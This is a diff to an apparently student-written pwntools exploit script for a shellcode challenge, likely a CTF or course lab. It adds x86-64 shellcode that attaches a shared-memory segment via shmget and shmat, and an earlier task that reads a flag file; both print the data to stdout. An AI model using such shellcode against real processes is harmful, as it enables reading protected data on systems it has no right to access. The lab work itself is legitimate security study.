@@ -187,8 +187,9 @@ def mprotect_read_byte():
     return send_line
 
 
-def get_asm_put_onto_codeint():
+def task_2_asm_byte():
     # put data start from codeint start + 5*0x10000, second half of codeint
+    global start_code_address
     FLAG_string_address = start_code_address + 5*0x10000
     read_content_address = start_code_address + 5*0x10000 + 0x100  # 16 bytes is enough for "0x2f464c414700"
     print("FLAG_string_address in hex str: ", str(hex(FLAG_string_address)))
@@ -223,7 +224,7 @@ def get_asm_put_onto_codeint():
         # rax: read syscall number 0
         # rdi: fd, r9
         # rsi: read content store into where
-        # rdx: count, read 200 byte (flag)
+        # rdx: count, read 67 byte (flag len)
         asm("""mov rax, 0
         mov rdi, r9"""),
         asm("mov rsi, " + str(hex(read_content_address)) + "\n"),
@@ -235,7 +236,7 @@ def get_asm_put_onto_codeint():
         # rax: write syscall number 1
         # rdi: fd, stdout 1
         # rsi: write the content from what address
-        # rdx: count, write 200 byte to stdout and end at null terminator
+        # rdx: count, write 67 byte to stdout and end at null terminator (flag len)
         asm("""mov rax, 1
         mov rdi, 1"""),
         asm("mov rsi, " + str(hex(read_content_address)) + "\n"),
@@ -248,11 +249,6 @@ def get_asm_put_onto_codeint():
         # rdi: fd, r9
         asm("""mov rax, 3
         mov rdi, r9
-        syscall"""),
-
-        # exit 0
-        asm("""mov rax, 60
-        mov rdi, 0
         syscall""")
     )
 
@@ -260,6 +256,117 @@ def get_asm_put_onto_codeint():
     # print("disassembly:\n", disassembly)
 
     return send_line
+
+
+def task_3_asm_byte():
+    global start_code_address
+    virtual_memory_address = start_code_address + 5*0x10000 + 0x1000 # shmaddr need to align to page (4096 = 0x1000)
+    # 1. sys_shmget
+    #    -> create or access a share memory
+    # 2. shmat
+    #    -> map the share memory to the virtual memory of this process,
+    #       so this process can directly access the data in the memory just like the data is belong to this process
+
+    # 1. sys_shmget
+    # rax: sys_shmget syscall number 29
+    # rdi: key, 0x1337 -> 0x3713 (byte ordering)
+    # rsi: size of the share memory you want to get, 100
+    # rdx: shmflg, if flag not use than will get the exist segment associated with key
+    #       -> "flag not use" == set to 0 (?)
+    # return shmid, check is not -1
+    # "v: %d\n" -> 0x763a2025640a -> 0x0a6425203a76
+
+    # 2. shmat
+    # rax: shmat syscall number 30
+    # rdi: shmid, the return value of sys_shmget, in rax
+    # rsi: shmaddr, can give the virtual memory address we want it map to, ex: a section of codeint,
+    #      if 0 then system will allocate virtual memory for us
+    #      shmat will return the address it map to in rax
+    # rdx: shmflg, SHM_RDONLY -> 010000(*oct*) -> 0x1000(hex) -> 4096(dec), see https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/bits/shm.h.html
+    # shmat() returns the address of the attached shared memory segment
+
+    # 3. write the content in the virtual memory address out to the stdout 
+    # rax: write syscall number 1
+    # rdi: fd, stdout 1
+    # rsi: write the content from the virtual memory address map to share memory(attach memory segment return from shmat)
+    # rdx: count, write 100 byte to stdout and end at null terminator
+    
+    # i think is correct
+    send_line = asm("""mov rax, 29
+        mov rdi, 0x1337
+        mov rsi, 200
+        mov rdx, 0
+        syscall
+        mov rdi, rax
+        mov rax, 30
+        mov rsi, 0
+        mov rdx, 0x1000
+        syscall
+        mov r14, rax
+        mov rax, 1
+        mov rdi, 1
+        mov rsi, r14
+        mov rdx, 200
+        syscall""")
+
+    # 4. if want to print a reg
+    # (1) put format string into a place on codeint
+    # (2) mov rsi, codeint addr
+    # (3) xor rax, rax
+    # (4) call printf -> not sure if we can call printf
+    #       [1] rdi - format string address -> place format string onto a place on codeint
+    #       [2] rsi - the value want to insert into format string
+
+    # send_line = asm("""mov rax, 29
+    #     mov rdi, 0x1337
+    #     mov rsi, 200
+    #     mov rdx, 0
+    #     syscall
+
+    #     mov rdi, 0x0a6425203a76
+
+
+    #     mov rdi, rax
+    #     mov rax, 30
+    #     mov rsi, 0
+    #     mov rdx, 0x10000
+    #     syscall
+    #     mov r14, rax
+    #     mov rax, 1
+    #     mov rdi, 1
+    #     mov rsi, r14
+    #     mov rdx, 200
+    #     syscall""")
+
+
+    # send_line = asm("""mov rax, 29
+    #     mov rdi, 0x3713
+    #     mov rsi, 200
+    #     mov rdx, 0
+    #     syscall
+    #     mov rdi, rax
+    #     mov rax, 30
+    #     mov rsi, """ + str(hex(virtual_memory_address)) + """
+    #     mov rdx, 0x010000
+    #     syscall
+    #     mov r14, rax
+    #     mov rax, 1
+    #     mov rdi, 1
+    #     mov rsi, """ + str(hex(virtual_memory_address)) + """
+    #     mov rdx, 200
+    #     syscall""")
+
+    disassembly = disasm(send_line) # Disassemble shellcode
+    print("disassembly:\n", disassembly)
+
+    return send_line
+
+
+def exit_0_asm_byte():
+    # exit 0
+    return asm("""mov rax, 60
+        mov rdi, 0
+        syscall""")
 
 
 if __name__ == '__main__':
@@ -293,6 +400,8 @@ if __name__ == '__main__':
     send_line = mprotect_read_byte()
     # send_line += exit_37_byte()
     # print("send_line_1: ", send_line)
+
+    # gdb.attach(r)
     
     r.send(send_line)
 
@@ -303,7 +412,9 @@ if __name__ == '__main__':
     print(r.recv())
 
     # [second send] -> input the asm we want to execute and it will be store into the start of codeint
-    send_line_2 = get_asm_put_onto_codeint()
+    # send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
+    send_line_2 = task_3_asm_byte() + exit_0_asm_byte()
+
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
     print("after send 2 - 1")
